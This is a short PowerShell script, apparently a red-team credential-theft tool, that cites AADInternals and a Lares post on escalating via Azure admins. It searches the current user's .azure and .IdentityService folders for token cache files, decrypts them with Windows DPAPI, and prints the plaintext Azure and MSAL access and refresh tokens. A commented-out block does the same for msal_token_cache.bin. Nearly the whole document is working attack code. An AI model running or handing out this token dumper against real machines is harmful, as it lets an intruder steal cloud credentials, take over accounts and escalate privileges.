#https://aadinternals.com/aadinternals/
#https://www.lares.com/blog/hunting-azure-admins-for-vertical-escalation/
Add-Type -AssemblyName System.Security

$tokenPaths = @(
    "$($env:USERPROFILE)/.azure/",
    "$($env:LOCALAPPDATA)/.IdentityService/"
)

foreach ($path in $tokenPaths){
    
    foreach ($fullpath in (Get-ChildItem -Recurse -Path $path -Include "*.bin", "*.cae", "*.cache", "*.nocae" -ErrorAction SilentlyContinue).FullName){
            $dfileinfo = [pscustomobject]@{
            filePath = $fullpath
            tokenData = ""
        }
        
        $fileBytes = [System.IO.File]::ReadAllBytes($fullpath)
        $dFileBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($fileBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        $uFile = [System.Text.Encoding]::UTF8.GetString($dFileBytes)

        $dfileinfo.tokenData = $uFile

        $dfileinfo.tokenData
    }
}



# $fileBytes = [System.IO.File]::ReadAllBytes("$($env:HOMEDRIVE)\Users\$($env:USERNAME)\.azure\msal_token_cache.bin")
# $dFileBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($fileBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
# $uFile = [System.Text.Encoding]::UTF8.GetString($dFileBytes)

# $uFile
